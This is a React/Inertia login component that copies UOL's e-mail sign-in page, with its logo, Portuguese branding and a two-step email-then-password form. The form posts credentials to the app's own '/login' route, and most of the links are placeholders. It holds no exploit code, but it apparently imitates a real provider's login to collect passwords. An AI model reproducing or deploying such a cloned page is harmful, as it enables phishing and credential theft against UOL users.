import { Button } from '@/components/ui/button';
import { Card, CardContent, CardFooter, CardHeader } from '@/components/ui/card';
import UolInput from '@/components/uol-input';
import GuestLayout from '@/Layouts/GuestLayout';
import { useForm } from '@inertiajs/react';
import { FormEvent } from 'react';
import usuario from './icons_login_usuario.png';

export default function Login({ id }: { id?: string }) {
    const { data, setData, post, put, processing, errors } = useForm({
        email: '',
        password: '',
        remember: false as boolean,
    });

    const submitId = (e: React.FormEvent) => {
        e.preventDefault();
        post('/login');
    };

    const handleLogin = (e: FormEvent) => {
        e.preventDefault();
        put('/login', {});
    };

    return (
        <GuestLayout>
            <Card className="w-full max-w-sm rounded-lg border bg-white">
                <CardHeader className="pb-6 text-center">
                    <div className="flex">
                        <img src="/logo_uolmail2.png" alt="E-mail UOL" className="h-10" />
                    </div>
                    <div className="">
                        <p className="text-left text-gray-800">Gerencie seus e-mails com a segurança que só o UOL te oferece.</p>
                    </div>
                </CardHeader>

                <CardContent>
                    {id ? (
                        <>
                            <p className="text-xl font-medium text-gray-800">Entrar</p>
                            <p className="text-center text-base font-medium text-gray-800">Informe sua senha</p>
                            <EmailSet email={id} />
                            <p className="py-2" />
                            <form onSubmit={handleLogin} className="space-y-4">
                                <div className="space-y-2">
                                    {errors.password && (
                                        <div className="flex h-16 bg-gray-200 p-2 break-words">
                                            <p className="mr-2 size-[22px] min-w-[22px] items-center justify-center rounded-full bg-red-700 text-center text-white">
                                                X
                                            </p>
                                            <strong className="tracking-wide">{errors.password}</strong>
                                        </div>
                                    )}
                                    <UolInput
                                        key="password"
                                        label="Senha"
                                        inputProps={{
                                            id: 'password',
                                            type: 'password',
                                            value: data.password,
                                            onChange: (e) => setData('password', e.target.value),
                                            required: true,
                                        }}
                                    />
                                </div>

                                <Button
                                    type="submit"
                                    disabled={processing}
                                    className="w-full rounded-md bg-[#e29933] px-4 py-3 font-medium text-white transition-colors duration-200 hover:bg-[#d4862e] disabled:opacity-50"
                                >
                                    {processing ? 'Corregando...' : 'Entrar'}
                                </Button>
                            </form>
                        </>
                    ) : (
                        <form onSubmit={submitId} className="space-y-4">
                            <div className="space-y-2">
                                <p className="text-xl font-medium text-gray-800">Entrar</p>
                                {errors.email && (
                                    <div className="flex h-16 bg-gray-200 p-2 break-words">
                                        <p className="mr-2 size-[22px] min-w-[22px] items-center justify-center rounded-full bg-red-700 text-center text-white">
                                            X
                                        </p>
                                        <strong className="tracking-wide">{errors.email}</strong>
                                    </div>
                                )}
                                <UolInput
                                    key="email"
                                    label="E-mail"
                                    inputProps={{
                                        id: 'email',
                                        type: 'email',
                                        placeholder: '@uol.com.br',
                                        value: data.email,
                                        onChange: (e) => setData('email', e.target.value),
                                        required: true,
                                    }}
                                />
                            </div>

                            <Button
                                type="submit"
                                disabled={processing}
                                className="w-full rounded-md bg-[#e29933] px-4 py-3 font-medium text-white transition-colors duration-200 hover:bg-[#d4862e] disabled:opacity-50"
                            >
                                {processing ? 'Corregando...' : 'Continuar'}
                            </Button>
                        </form>
                    )}
                </CardContent>

                <CardFooter className="flex flex-col items-center space-y-3 pt-4">
                    <div className="text-center">
                        <p className="text-sm text-gray-600">
                            Ainda não tem e-mail UOL?{' '}
                            <a href="" className="font-medium text-[#1082be] hover:text-blue-500" target="_blank" rel="noopener noreferrer">
                                ASSINE JÁ
                            </a>
                        </p>
                        <p className="mt-2 text-sm text-[#1082be] hover:text-blue-500">
                            <a href="#" className="transition-colors">
                                Esqueceu a senha?
                            </a>
                        </p>
                    </div>
                </CardFooter>
            </Card>

            <div className="mt-8 max-w-md space-y-2 text-center text-xs text-gray-500">
                <p>Sua senha é secreta.</p>
                <p>Nenhum funcionário a serviço do UOL está autorizado a solicitá-la</p>
                <div className="flex justify-center space-x-4">
                    <a href="#" className="text-blue-600 hover:text-blue-800">
                        Regras de uso
                    </a>
                    <a href="#" className="text-blue-600 hover:text-blue-800">
                        Política anti-spam
                    </a>
                    <a href="#" className="text-blue-600 hover:text-blue-800">
                        Crimes virtuais: denuncie
                    </a>
                </div>
            </div>
        </GuestLayout>
    );
}

function EmailSet({ email }: { email: string }) {
    return (
        <div className="flex max-h-10 items-center rounded-full border border-gray-300 px-4 py-3 text-sm text-gray-800">
            <img src={usuario} width="28px" height="28px" alt="Ícone de usuário" />
            <span className="ml-2 text-gray-800">{email}</span>
            <p className="flex-1 cursor-pointer justify-end">
                <span className="flex justify-end">x</span>
            </p>
        </div>
    );
}
